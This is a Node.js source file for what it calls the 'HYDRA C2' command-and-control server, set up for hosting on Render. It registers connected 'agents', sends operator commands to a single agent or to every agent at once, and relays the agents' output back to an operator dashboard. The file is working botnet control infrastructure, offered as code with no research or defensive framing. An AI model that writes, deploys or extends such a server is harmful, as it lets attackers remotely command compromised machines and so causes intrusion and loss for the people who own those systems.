// TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
// NK HYDRA v120.0 [QUANTUM STABLE]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

// --- ANTI-CRASH HANDLERS ---
process.on('uncaughtException', (err) => {
    console.error('CRITICAL: Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('CRITICAL: Unhandled Rejection:', reason);
});

const app = express();
app.use(cors());

app.get('/', (req, res) => { res.send('HYDRA C2 v120.0 [STABLE]'); });

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    // Render defaults: 25s interval, 60s timeout
    pingInterval: 25000, 
    pingTimeout: 60000,
    transports: ['polling', 'websocket'] 
});

let agents = []; 

io.on('connection', (socket) => {
    
    socket.on('identify', (data) => {
        try {
            if (data.type === 'ui') {
                socket.join('ui_room');
                socket.emit('agents_list', agents);
                return;
            }

            console.log(`[+] Agent Identified: ${data.id}`);
            
            // Deduplicate
            agents = agents.filter(a => a.id !== data.id);
            
            agents.push({ 
                ...data, 
                socketId: socket.id, 
                status: 'Online', 
                lastSeen: Date.now() 
            });
            
            io.to('ui_room').emit('agents_list', agents);
        } catch (e) {
            console.error("Identify Error:", e);
        }
    });

    socket.on('exec_cmd', (data) => {
        try {
            const { targetId, cmd } = data;
            console.log(`[CMD] ${cmd} -> ${targetId}`);
            
            io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `TX: ${cmd}` });

            if (targetId === 'all') {
                agents.forEach(agent => {
                    if (agent.status === 'Online' && agent.socketId) {
                        try {
                            io.to(agent.socketId).emit('exec_cmd', { cmd });
                        } catch (err) {
                            console.error(`Failed to send to ${agent.id}: `, err.message);
                        }
                    }
                });
            } else {
                const target = agents.find(a => a.id === targetId);
                if (target && target.status === 'Online') {
                    io.to(target.socketId).emit('exec_cmd', { cmd });
                }
            }
        } catch (e) {
            console.error("Exec Error:", e);
        }
    });
    
    socket.on('agent_event', (data) => {
        try {
            io.to('ui_room').emit('agent_event', data);
        } catch (e) { console.error("Relay Error:", e); }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v120 LISTENING ON ${PORT}`));
